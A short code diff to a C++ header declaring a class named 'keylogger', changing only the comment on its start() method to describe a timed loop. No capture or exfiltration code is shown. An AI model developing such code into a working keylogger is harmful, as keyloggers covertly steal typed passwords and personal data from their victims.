@@ -29,7 +29,7 @@ class keylogger
 		virtual ~keylogger();
 
     /*
-    * Did an infinite loop and store and call method store
+    * Did an loop of a_timer seconds
     */
     virtual void start();
 
